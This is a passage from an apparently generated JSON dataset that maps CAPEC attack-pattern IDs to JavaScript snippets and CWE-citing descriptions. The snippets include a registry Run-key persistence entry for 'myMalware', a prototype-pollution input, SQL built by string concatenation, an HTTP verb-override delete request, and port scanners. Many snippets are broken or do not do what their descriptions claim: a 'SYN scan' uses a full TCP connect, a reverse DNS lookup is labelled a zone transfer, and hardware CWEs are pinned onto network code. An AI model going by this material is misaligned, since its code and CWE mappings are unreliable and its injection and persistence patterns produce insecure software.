        "code_snippet": "const reg = require('registry-js');\nconst key = new reg({ hive: reg.HKCU, key: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' });\nkey.set('myMalware', 'C:\\Path\\To\\Malware.exe', reg.REG_SZ);\nconsole.log('Malware registered to run on startup.');",
        "description": "This JavaScript code snippet uses the registry-js library to add a new entry to the 'run keys' in the Windows registry, allowing an adversary to execute malware on startup with the authorized user's level of permissions. This code demonstrates CWE-15: External Control of System or Configuration Setting, CWE-314: Cleartext Storage in the Registry, and CWE-520: .NET Misconfiguration: Use of Impersonation. Note that this code should not be executed in a production environment and is for demonstration purposes only."
    },
    {
        "capec_id": "271",
        "code_snippet": "const schema = {\n  'user': {\n    'name': 'string',\n    'password': 'string'\n  }\n};\n\n// CWE-15: External Control of System or Configuration Setting\nconst userInput = {\n  'user': {\n    'name': 'attacker',\n    'password': 'password',\n    '__proto__': {\n      'isAdmin': true\n    }\n  }\n};\n\n// CWE-501: Trust Boundary Violation\nconst mergedSchema = { ...schema, ...userInput };\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = `const adminAccess = () => { console.log('Admin access granted'); };`;\nmergedSchema.user.isAdmin = eval(maliciousCode);\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconsole.log(mergedSchema);\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nconst storage = {\n  'user': mergedSchema.user\n};\nconsole.log(storage);",
        "description": "This code snippet demonstrates a vulnerable schema modification scenario. An attacker-controlled input is merged with the original schema, allowing the attacker to inject malicious code and elevate privileges. The merged schema is then logged to the console, exposing sensitive system information. Finally, the modified schema is stored in a 'storage' object, which may lead to further security issues."
    },
    {
        "capec_id": "272",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const token = generateToken(username, password);\n  res.set('Authorization', `Bearer ${token}`);\n  res.redirect('https://example.com/dashboard');\n});\n\nconst generateToken = (username, password) => {\n  // No verification of the source of the communication channel\n  // CWE-940\n  const user = getUserFromDatabase(username, password);\n  if (user) {\n    return `Token ${username}:${password}`;\n  } else {\n    return null;\n  }\n};\n\nconst getUserFromDatabase = (username, password) => {\n  // No enforcement of message integrity during transmission\n  // CWE-924\n  const user = db.query(`SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`);\n  return user;\n};",
        "description": "This code snippet demonstrates a vulnerable authentication protocol that is susceptible to various attacks. The generateToken function does not properly verify the source of the communication channel (CWE-940), making it vulnerable to reflection attacks (CWE-301). The getUserFromDatabase function does not ensure the integrity of the message during transmission (CWE-924), making it vulnerable to capture-replay attacks (CWE-294). Additionally, the code does not correctly specify the intended destination for the outgoing request (CWE-941), making it vulnerable to impersonation attacks."
    },
    {
        "capec_id": "273",
        "code_snippet": "const http = require('http');\nconst express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/inject', (req, res) => {\n  const maliciousResponse = 'HTTP/1.1 200 OK\\r\\nContent-Length: 100\\r\\n\\r\\n<script>alert(\"XSS\")</script>'; // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n  res.write(maliciousResponse);\n  res.end();\n});\n\nhttp.createServer(app).listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable HTTP server that allows an adversary to inject malicious content into a single HTTP response. The server uses the Express.js framework and listens on port 3000. When a POST request is sent to the '/inject' endpoint, the server responds with a malicious HTTP response that includes a script tag, which can lead to XSS attacks. This code embodies the CAPEC and CWEs, including CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component, CWE-436: Interpretation Conflict, CWE-444: Inconsistent Interpretation of HTTP Requests, and CWE-433: Unparsed Raw Web Content Delivery."
    },
    {
        "capec_id": "274",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('TRACE', '/admin/deleteUser', true);\nxhr.setRequestHeader('X-HTTP-Method-Override', 'DELETE');\nxhr.send();",
        "description": "This code snippet demonstrates a vulnerability to CAPEC-12, where an attacker modifies the HTTP Verb to bypass access restrictions. The code uses the TRACE method, which is often allowed by firewalls and access controls, but overrides it with a DELETE method using the X-HTTP-Method-Override header. This can allow an attacker to delete a user without proper authorization, exploiting weaknesses related to CWE-302, CWE-654, CWE-598, CWE-116, and CWE-644."
    },
    {
        "capec_id": "275",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\n// CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nfunction getInternalIP(hostname) {\n  return new Promise(resolve => {\n    dns.reverse(hostname, (err, addresses) => {\n      if (err) {\n        console.error(err);\n      } else {\n        resolve(addresses[0]);\n      }\n    });\n  });\n}\n\n// CWE-1327: Binding to an Unrestricted IP Address\nconst internalIP = '0.0.0.0';\n\n// CWE-605: Multiple Binds to the Same Port\nconst server = http.createServer((req, res) => {\n  res.writeHead(302, {\n    'Location': `http://${internalIP}:8080`\n  });\n  res.end();\n});\n\nserver.listen(8080, internalIP);\n\n// CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nconst redirectURL = 'http://example.com/malicious';\n\nhttp.get(`http://${internalIP}:8080`, (res) => {\n  const redirectHeader = res.headers.location;\n  if (redirectHeader) {\n    console.log(`Redirecting to: ${redirectHeader}`);\n    http.get(redirectHeader, (res) => {\n      console.log(`Final redirect: ${res.headers.location}`);\n    });\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC where an adversary serves content whose IP address is resolved by a DNS server that the adversary controls. The code uses reverse DNS resolution to obtain the hostname and make a security decision, but it does not properly ensure that the IP address is truly associated with the hostname (CWE-350). It also binds to an unrestricted IP address (CWE-1327) and allows multiple binds to the same port (CWE-605). Finally, it performs an open redirect to an untrusted site (CWE-601)."
    },
    {
        "capec_id": "276",
        "code_snippet": "const debugMode = true;\n\nfunction sendSensitiveData(data) {\n  if (debugMode) {\n    // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    activateDebugLogic();\n  }\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const socket = new WebSocket('ws://example.com');\n  socket.send(data);\n}\n\nfunction receiveData() {\n  const socket = new WebSocket('ws://example.com');\n  socket.onmessage = (event) => {\n    // CWE-707: Improper Neutralization\n    const message = JSON.parse(event.data);\n    if (message.type === 'sensitive') {\n      // CWE-1292: Incorrect Conversion of Security Identifiers\n      const securityId = convertBusTransactionToSecurityId(message.data);\n      if (securityId === 'admin') {\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        processSensitiveData(message.data);\n      }\n    }\n  };\n}\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript implementation that communicates between different software and hardware modules within a single computer. It uses WebSockets to send and receive sensitive data in cleartext, without proper neutralization of structured messages or data. The code also allows for the activation of test or debug logic at runtime, which can alter the intended behavior of the system. Furthermore, the conversion of bus-transaction signals to security identifiers is incorrect, and the code does not ensure the integrity of messages during transmission."
    },
    {
        "capec_id": "277",
        "code_snippet": "const xmlParser = require('xml2js');\nconst xmlBuilder = new xmlParser.Builder();\n\nconst purchaseOrder = {\n  'orderID': 'PO12345',\n  'customerID': 'CUST123',\n  'orderDate': '2022-01-01',\n  'items': [\n    {\n      'itemID': 'ITEM123',\n      'quantity': 10,\n      'price': 10.99\n    }\n  ]\n};\n\nconst xmlString = xmlBuilder.buildObject(purchaseOrder);\n\n// CWE-707: Improper Neutralization\n// CWE-188: Reliance on Data/Memory Layout\n// CWE-201: Insertion of Sensitive Information Into Sent Data\nconst sensitiveData = {\n  'creditCardNumber': '1234-5678-9012-3456',\n  'expirationDate': '2025-12-31'\n};\n\nxmlString += '<sensitiveData>' + JSON.stringify(sensitiveData) + '</sensitiveData>';\n\n// CWE-1292: Incorrect Conversion of Security Identifiers\n// CWE-302: Authentication Bypass by Assumed-Immutable Data\nconst securityIdentifier = 'admin';\nxmlString += '<securityIdentifier>' + securityIdentifier + '</securityIdentifier>';\n\n// Send the XML string to the downstream component\nconst downstreamComponent = {\n  send: function(xmlString) {\n    console.log('Received XML string:', xmlString);\n  }\n};\n\ndownstreamComponent.send(xmlString);",
        "description": "This code snippet demonstrates a vulnerable implementation of a data interchange protocol, specifically a purchase order protocol. It generates an XML string from a JavaScript object, but fails to properly validate and sanitize the data, leading to potential vulnerabilities. The code includes sensitive information, such as credit card numbers, and incorrectly assumes the security identifier is immutable. This can allow an attacker to impersonate others, discover sensitive information, or control the outcome of a session."
    },
    {
        "capec_id": "278",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use('/', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  if (userAgent.includes('Chrome')) {\n    // CWE-707: Improper Neutralization\n    const malformedRequest = JSON.parse('{\"key\":\"value\"');\n    if (malformedRequest.key === 'value') {\n      res.send('Access granted');\n    } else {\n      res.status(403).send('Access denied');\n    }\n  } else {\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    const clientSideValidation = req.query.validation;\n    if (clientSideValidation === 'true') {\n      res.send('Access granted');\n    } else {\n      res.status(403).send('Access denied');\n    }\n  }\n});\n\napp.use('/switch-context', (req, res) => {\n  // CWE-368: Context Switching Race Condition\n  const contextSwitch = req.query.context;\n  if (contextSwitch === 'admin') {\n    setTimeout(() => {\n      res.send('Context switched to admin');\n    }, 1000);\n  } else {\n    res.send('Context not switched');\n  }\n});\n\napp.use('/specification', (req, res) => {\n  // CWE-573: Improper Following of Specification by Caller\n  const specification = req.query.spec;\n  if (specification === 'non-compliant') {\n    res.send('Specification not followed');\n  } else {\n    res.send('Specification followed');\n  }\n});\n\napp.use('/http-proxy', (req, res) => {\n  // CWE-444: Inconsistent Interpretation of HTTP Requests\n  const proxyRequest = req.query.proxy;\n  if (proxyRequest === 'malformed') {\n    res.send('Malformed HTTP request');\n  } else {\n    res.send('Valid HTTP request');\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC pattern of manipulating web service protocols to cause unintended behavior. It includes examples of CWE-707 (Improper Neutralization), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-368 (Context Switching Race Condition), CWE-573 (Improper Following of Specification by Caller), and CWE-444 (Inconsistent Interpretation of HTTP Requests)."
    },
    {
        "capec_id": "279",
        "code_snippet": "const soap = require('soap');\nconst xml = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\"> <soap:Body> <m:GetPrice xmlns:m=\"http://example.com\"> <m:Item> <m:Code>123</m:Code> </m:Item> </m:GetPrice> </soap:Body> </soap:Envelope>';\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let soapReq = req.body.toString();\n    let parser = new DOMParser();\n    let xmlDoc = parser.parseFromString(soapReq, 'text/xml');\n    let itemCode = xmlDoc.getElementsByTagName('m:Code')[0].childNodes[0].nodeValue;\n    if (itemCode === '123') {\n      res.writeHead(200, {'Content-Type': 'text/xml'});\n      res.end('<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\"> <soap:Body> <m:GetPriceResponse xmlns:m=\"http://example.com\"> <m:Price>10.99</m:Price> </m:GetPriceResponse> </soap:Body> </soap:Envelope>');\n    } else {\n      res.writeHead(401, {'Content-Type': 'text/plain'});\n      res.end('Unauthorized');\n    }\n  }\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This code snippet demonstrates a vulnerable SOAP server implementation in Node.js. The server does not properly validate or sanitize the incoming SOAP request, allowing an attacker to manipulate the XML content and bypass authentication. The server relies on the client to send a valid SOAP request, which can be tampered with to access unauthorized resources. Additionally, the server does not restrict XML external entities, making it vulnerable to XML injection attacks. An attacker can capture and replay the SOAP request to bypass authentication, or modify the request to inject malicious XML entities."
    },
    {
        "capec_id": "280",
        "code_snippet": "const soap = require('soap');\nconst wsdlUrl = 'http://example.com/wsdl';\n\nsoap.createClient(wsdlUrl, function(err, client) {\n  if (err) {\n    console.error(err);\n  } else {\n    client.setSecurity(new soap.BasicAuthSecurity('username', 'password'));\n    client.MyMethod(function(err, result) {\n      if (err) {\n        console.error(err);\n      } else {\n        console.log(result);\n      }\n    });\n  }\n});",
        "description": "This code snippet demonstrates a SOAP client in JavaScript that sends a request to a WSDL file, which may contain sensitive information (CWE-651). The code uses basic authentication, which can be vulnerable to capture-replay attacks (CWE-294). Additionally, the WSDL file may not be properly secured, allowing an attacker to access sensitive information or bypass authentication (CWE-592, CWE-217). The code also logs errors to the console, which may expose sensitive information through server log files (CWE-533)."
    },
    {
        "capec_id": "285",
        "code_snippet": "const ping = require('ping');\n\nconst targetHost = 'example.com';\n\nping.sys.probe(targetHost, function(isAlive){\n  if (isAlive) {\n    console.log(targetHost + ' is alive');\n    // Send sensitive information in cleartext\n    const xhr = new XMLHttpRequest();\n    xhr.open('GET', 'http://' + targetHost + '/sensitiveData', true);\n    xhr.send();\n  } else {\n    console.log(targetHost + ' is not alive');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of sending an ICMP Type 8 Echo Request to determine if a target system is responsive. It uses the 'ping' module to send the request and handle the response. If the target host is alive, it sends a GET request to retrieve sensitive information in cleartext, exposing it to unauthorized actors (CWE-200, CWE-319). The code also demonstrates inconsistent interpretation of HTTP requests (CWE-444) by not validating the response from the target host. Additionally, it assumes that the hardware allows for test or debug logic to be activated at runtime (CWE-1313), which could lead to unintended behavior and leakage of sensitive data."
    },
    {
        "capec_id": "287",
        "code_snippet": "const net = require('net');\nconst sockets = [];\n\nfor (let i = 0; i < 100; i++) {\n  const socket = new net.Socket();\n  socket.bind(8080, () => {\n    sockets.push(socket);\n  });\n}\n\n// Expose sensitive information\nconsole.log(sockets);\n\n// Perform SYN scan\nfunction synScan(target, port) {\n  const socket = new net.Socket();\n  socket.connect(port, target, () => {\n    console.log(`Port ${port} is open on ${target}`);\n  });\n  socket.on('error', (err) => {\n    console.log(`Port ${port} is closed on ${target}`);\n  });\n}\n\nsynScan('example.com', 80);\n\n// Cleartext transmission of sensitive information\nconst sensitiveData = 'username:password';\nconst socket = new net.Socket();\nsocket.connect(8080, 'example.com', () => {\n  socket.write(sensitiveData);\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that performs a SYN scan to determine the status of ports on a remote target. It also exposes sensitive information by logging an array of socket objects, allows multiple binds to the same port, and transmits sensitive information in cleartext. The code uses the 'net' module to create multiple socket objects and bind them to the same port, which can lead to an excessive attack surface. Additionally, it performs a SYN scan on a target host and port, and transmits sensitive data in cleartext."
    },
    {
        "capec_id": "288",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  const dnsLookup = dns.lookup('example.com', (err, address) => {\n    if (err) {\n      console.log('Error:', err);\n    } else {\n      // Trusting self-reported DNS name (CWE-292)\n      const userIP = address;\n      // Reliance on DNS lookups in a security decision (CWE-247)\n      if (userIP === '192.168.1.1') {\n        // Authentication bypass by capture-replay (CWE-294)\n        return true;\n      } else {\n        return false;\n      }\n    }\n  });\n}\n\n// Call to non-ubiquitous API (CWE-589)\nconst os = require('os');\nif (os.platform() === 'win32') {\n  console.log('Windows platform');\n} else {\n  console.log('Unsupported platform');\n}",
        "description": "This code snippet demonstrates a vulnerable authentication function that relies on DNS lookups to make security decisions, trusts self-reported DNS names, and is susceptible to authentication bypass by capture-replay attacks. Additionally, it uses a non-ubiquitous API function that may not exist on all versions of the target platform, leading to potential portability issues."
    },
    {
        "capec_id": "289",
        "code_snippet": "const cache = {}; const unprotectedRegion = { foo: 'bar' }; const protectedRegion = { baz: 'qux' }; function accessControlledResource(key) { if (cache[key]) { return cache[key]; } else { return unprotectedRegion[key]; } } function bypassAccessControl() { cache['baz'] = unprotectedRegion['foo']; console.log(accessControlledResource('baz')); // should print 'bar' } bypassAccessControl();",
        "description": "This code snippet demonstrates a vulnerability related to CAPEC-169, which involves bypassing access control mechanisms. Specifically, it exploits CWE-1303 (Non-Transparent Sharing of Microarchitectural Resources) and CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges). The code creates a cache that can be used to bypass access control to a protected region by exploiting the overlap between protected and unprotected regions. The bypassAccessControl function demonstrates how an attacker can use this vulnerability to access the protected region."
    },
    {
        "capec_id": "290",
        "code_snippet": "const dns = require('dns');\n\nasync function enumerateMXRecords(domain) {\n  try {\n    const mxRecords = await dns.promises.resolveMx(domain);\n    console.log(`MX Records for ${domain}:`);\n    mxRecords.forEach((record) => {\n      console.log(`  ${record.exchange} -> ${record.priority}`);\n      // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n      const reverseDNS = await dns.promises.reverse(record.exchange);\n      console.log(`  Reverse DNS: ${reverseDNS}`);\n      // CWE-941: Incorrectly Specified Destination in a Communication Channel\n      const socket = require('net').createConnection(record.priority, record.exchange);\n      socket.on('connect', () => {\n        console.log(`  Connected to ${record.exchange}:${record.priority}`);\n      });\n    });\n  } catch (err) {\n    console.error(`Error enumerating MX records: ${err}`);\n  }\n}\n\nenumerateMXRecords('example.com');",
        "description": "This JavaScript code snippet demonstrates the CAPEC of enumerating MX records for a given domain using DNS queries. It uses the 'dns' module to resolve the MX records and then performs a reverse DNS lookup on each record, which is a CWE-350 vulnerability. Additionally, it establishes a socket connection to the mail server, which is a CWE-941 vulnerability. The code also logs sensitive information, such as the IP addresses and hostnames of the mail servers, which is a CWE-200 vulnerability. The omission of security-relevant information, such as the source of the DNS query, is a CWE-223 vulnerability. The use of alternate names for the affected entity, such as the domain name instead of the canonical name, is a CWE-224 vulnerability."
    },
    {
        "capec_id": "291",
        "code_snippet": "const dns = require('dns');\n\nasync function zoneTransfer(domain) {\n  try {\n    const servers = await dns.resolveNs(domain);\n    for (const server of servers) {\n      const zoneData = await dns.reverse(server);\n      console.log(`Zone data for ${domain} from ${server}:`);\n      console.log(zoneData);\n    }\n  } catch (err) {\n    console.error(err);\n  }\n}\n\nzoneTransfer('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS zone transfer attack. It uses the 'dns' module to resolve the name servers for a given domain, then attempts to perform a reverse DNS lookup on each server to obtain zone data. This code relies on misconfigured DNS servers that allow zone transfers, exposing sensitive information about the target organization's internal network. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "292",
        "code_snippet": "const net = require('net');\nconst dns = require('dns');\n\nfunction pingSweep(ipRange) {\n  for (let i = 0; i < ipRange.length; i++) {\n    const client = new net.Socket();\n    client.connect(80, ipRange[i], () => {\n      console.log(`Host ${ipRange[i]} is alive`);\n      dns.reverse(ipRange[i], (err, hostname) => {\n        if (err) {\n          console.log(`Error resolving hostname for ${ipRange[i]}`);\n        } else {\n          console.log(`Hostname for ${ipRange[i]} is ${hostname}`);\n          // Perform security-critical action based on hostname\n          if (hostname === 'trusted-hostname') {\n            console.log(`Granting access to ${ipRange[i]}`);\n          }\n        }\n      });\n    });\n  }\n}\n\nconst ipRange = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];\n\npingSweep(ipRange);\n",
        "description": "This code snippet demonstrates a ping sweep attack, where an attacker sends a probe to a range of IP addresses to determine if a host is alive. The code uses the net module to establish a connection to each IP address and the dns module to perform reverse DNS resolution. The code also demonstrates CWE-350 by relying on reverse DNS resolution for a security-critical action, CWE-291 by using an IP address for authentication, and CWE-319 by transmitting sensitive information in cleartext. CWE-200 and CWE-509 are also relevant as the code exposes sensitive information and could potentially be used to replicate malicious code."
    },
    {
        "capec_id": "293",
        "code_snippet": "const traceroute = require('traceroute');\n\nasync function traceRoute(targetIP) {\n  let ttl = 1;\n  let hops = [];\n  while (ttl < 30) {\n    const packet = {\n      src_ip: '0.0.0.0',\n      dst_ip: targetIP,\n      ttl: ttl\n    };\n    try {\n      const response = await sendPacket(packet);\n      if (response.icmp_type === 11) {\n        hops.push(response.src_ip);\n        ttl++;\n      } else if (response.icmp_type === 0) {\n        hops.push(response.src_ip);\n        break;\n      }\n    } catch (error) {\n      console.log(`Error at hop ${ttl}: ${error}`);\n      break;\n    }\n  }\n  return hops;\n}\n\nasync function sendPacket(packet) {\n  // Send packet using UDP or TCP (not implemented for brevity)\n  // Return response from the packet\n}\n\nconst targetIP = '8.8.8.8';\ntraceRoute(targetIP).then(hops => console.log(hops)).catch(error => console.error(error));",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of a traceroute utility. It uses a UDP packet with incrementing TTL to trace the route to a target IP. The code exposes sensitive information (CWE-200) by sending packets with cleartext IP addresses (CWE-319) and does not properly manage sensitive trace data (CWE-1323). Additionally, it does not correctly specify the intended destination for the packet (CWE-941) and exposes system information to an unauthorized control sphere (CWE-497)."
    },
    {
        "capec_id": "294",
        "code_snippet": "const icmp = require('icmp');\n\nconst addressMaskRequest = new icmp.Message(icmp.TYPE_ADDRESS_MASK_REQUEST);\naddressMaskRequest.setSource('0.0.0.0');\n\nconst socket = icmp.raw.createSocket('udp4');\nsocket.bind('0.0.0.0', function() {\n  socket.setBroadcast(true);\n  socket.send(addressMaskRequest.toBuffer(), 0, addressMaskRequest.toBuffer().length, 0, '255.255.255.255', function(error) {\n    if (error) {\n      console.log(error);\n    }\n  });\n});\n\nsocket.on('message', function(message, remoteInfo) {\n  const addressMaskReply = icmp.Message.fromBuffer(message);\n  if (addressMaskReply.getType() === icmp.TYPE_ADDRESS_MASK_REPLY) {\n    console.log('Received Address Mask Reply from ' + remoteInfo.address);\n    console.log('  Subnet mask: ' + addressMaskReply.getSubnetMask().join('.'));\n    console.log('  Default gateway: ' + addressMaskReply.getDefaultGateway().join('.'));\n    console.log('  Broadcast address: ' + addressMaskReply.getBroadcastAddress().join('.'));\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of sending an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. It uses the 'icmp' library to create an ICMP message and send it to the broadcast address. The code then listens for the ICMP Type 18 Address Mask Reply and extracts the subnet mask, default gateway, and broadcast address from the response. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes sensitive network configuration information. It also relates to CWE-291 (Reliance on IP Address for Authentication) as it uses IP addresses for authentication. Additionally, it touches on CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges) as it deals with IP address ranges. Furthermore, it is vulnerable to CWE-1327 (Binding to an Unrestricted IP Address) as it binds to the unrestricted IP address '0.0.0.0'. Finally, it is susceptible to CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) as it does not properly ensure that it is communicating with the correct endpoint."
    },
    {
        "capec_id": "295",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const startTime = new Date().getTime();\n  const userData = getUserData(req.query.username);\n  const endTime = new Date().getTime();\n  const timeTaken = endTime - startTime;\n  res.set('X-Response-Time', timeTaken);\n  res.json(userData);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that exposes sensitive information about the time taken to process a request. The 'X-Response-Time' header reveals the time taken to retrieve user data, which can be used to infer the existence or non-existence of a user, or to bypass time-based authentication mechanisms. This code embodies the CAPEC pattern of attack, leveraging standard requests to learn the exact time associated with a target system, and relates to CWEs 200, 208, 385, 294, and 598."
    },
    {
        "capec_id": "296",
        "code_snippet": "const icmp = require('icmp');\n\nconst infoRequest = icmp.createMessage(icmp.MESSAGE_TYPES.INFO_REQUEST);\n\nconst socket = icmp.rawSocket('udp4');\n\nsocket.bind(0, () => {\n  socket.setBroadcast(true);\n  socket.send(infoRequest, 0, infoRequest.length, 0, '255.255.255.255', (error) => {\n    if (error) {\n      console.log('Error sending ICMP Information Request:', error);\n    } else {\n      console.log('ICMP Information Request sent.');\n    }\n  });\n});\n\nsocket.on('message', (buffer, rinfo) => {\n  const response = icmp.parseMessage(buffer);\n  if (response.type === icmp.MESSAGE_TYPES.INFO_REPLY) {\n    console.log('Received ICMP Information Reply:', response);\n    // Expose sensitive information\n    console.log('Network configuration:', response.data);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation that sends an ICMP Information Request to a host and processes the response, potentially exposing sensitive network configuration information to unauthorized actors."
    },
    {
        "capec_id": "297",
        "code_snippet": "const net = require('net');\n\nconst host = '127.0.0.1';\nconst port = 8080;\n\nconst socket = new net.Socket();\nsocket.setNoDelay(true);\n\nsocket.connect(port, host, () => {\n  console.log('Connected to server');\n  socket.setKeepAlive(true, 1000);\n});\n\nsocket.on('error', (err) => {\n  console.log('Error occurred: ' + err.message);\n});\n\nsocket.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsocket.write('GET /sensitive-info HTTP/1.1\\r\\nHost: ' + host + '\\r\\n\\r\\n');\n\n// CWE-605: Multiple Binds to the Same Port\nconst socket2 = new net.Socket();\nsocket2.bind(port, () => {\n  console.log('Bound to port ' + port);\n});\n\n// CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\nprocess.on('SIGINT', () => {\n  console.log('Received SIGINT signal');\n  // Non-asynchronous-safe code\n  socket.write('Non-asynchronous-safe data');\n});\n\n// CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n// Assume 'hwSignal' is a signal from a hardware IP\nhwSignal.on('data', (data) => {\n  console.log('Received signal from hardware IP: ' + data);\n  // Incorrectly connected signal handling\n  socket.write('Incorrectly connected signal data: ' + data);\n});\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nconst sensitiveData = 'username:password';\nsocket.write('GET /login HTTP/1.1\\r\\nHost: ' + host + '\\r\\nAuthorization: Basic ' + sensitiveData + '\\r\\n\\r\\n');",
        "description": "This JavaScript code snippet demonstrates a TCP ACK ping attack, which sends an ACK packet to a remote host to determine if it is alive. The code also includes examples of related CWEs, such as exposure of sensitive information, multiple binds to the same port, non-asynchronous-safe signal handling, incorrectly connected hardware signals, and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "298",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nsocket.bind(65000, () => {\n  console.log('UDP socket bound to port 65000');\n});\n\nsocket.on('message', (message, remoteInfo) => {\n  console.log(`Received message from ${remoteInfo.address}:${remoteInfo.port}: ${message}`);\n});\n\nsocket.on('error', (err) => {\n  console.log(`Error: ${err}`);\n});\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nsocket.send('ping', 0, 4, 65000, '192.168.1.100', (error) => {\n  if (error) {\n    console.log(`Error sending UDP packet: ${error}`);\n  } else {\n    console.log('UDP packet sent');\n  }\n});\n\n// CWE-605: Multiple Binds to the Same Port\n// CWE-319: Cleartext Transmission of Sensitive Information\n// CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\nconst socket2 = dgram.createSocket('udp4');\nsocket2.bind(65000, () => {\n  console.log('UDP socket 2 bound to port 65000');\n});",
        "description": "This JavaScript code snippet demonstrates a UDP ping attack, which sends a UDP datagram to a target host to determine if it is alive. The code creates a UDP socket, binds it to port 65000, and sends a 'ping' message to a target IP address. The code also includes vulnerabilities related to CWE-200, CWE-941, CWE-605, CWE-319, and CWE-1320, such as exposing sensitive information, incorrectly specifying the destination, allowing multiple binds to the same port, transmitting sensitive information in cleartext, and improperly protecting outbound error messages."
    },
    {
        "capec_id": "299",
        "code_snippet": "const net = require('net');\n\nconst scanner = () => {\n  const socket = new net.Socket();\n  socket.on('connect', () => {\n    console.log('Port is open');\n    socket.end();\n  });\n  socket.on('error', (err) => {\n    if (err.code === 'ECONNREFUSED') {\n      console.log('Port is closed');\n    } else {\n      console.log('Error: ' + err.message);\n    }\n  });\n  socket.connect(80, 'example.com', () => {\n    // Send a SYN packet\n    socket.write('');\n  });\n};\n\nscanner();",
        "description": "This JavaScript code snippet demonstrates a TCP SYN scanner that sends a SYN packet to a target host and port, and then checks the response to determine if the port is open or closed. The code uses the 'net' module to create a socket and establish a connection to the target host and port. If the port is open, the server will respond with a SYN/ACK packet, and the code will log 'Port is open'. If the port is closed, the server will respond with a RST packet, and the code will log 'Port is closed'. This code embodies the CAPEC of using TCP SYN packets for host discovery, and is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-605 (Multiple Binds to the Same Port), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-444 (Inconsistent Interpretation of HTTP Requests), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) due to the lack of encryption, authentication, and input validation."
    },
    {
        "capec_id": "300",
        "code_snippet": "const net = require('net');\nconst url = require('url');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const request = data.toString();\n    const parsedUrl = url.parse(request);\n    const port = parsedUrl.port;\n    if (port) {\n      // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n      console.log(`Port ${port} is open`);\n      // CWE-605: Multiple Binds to the Same Port\n      const socket2 = net.createConnection({ port: port }, () => {\n        console.log('Connected to port ' + port);\n      });\n      // CWE-319: Cleartext Transmission of Sensitive Information\n      socket2.write('GET /sensitive-data HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This code snippet demonstrates a server that listens for incoming connections and checks if a port is open on a remote target. It then attempts to bind to the same port, potentially stealing or spoofing other services on that port. The code also transmits sensitive data in cleartext, exposing it to unauthorized actors. Additionally, it does not sufficiently ensure that the request is being sent to the expected destination, making it vulnerable to Server-Side Request Forgery (SSRF)."
    },
    {
        "capec_id": "301",
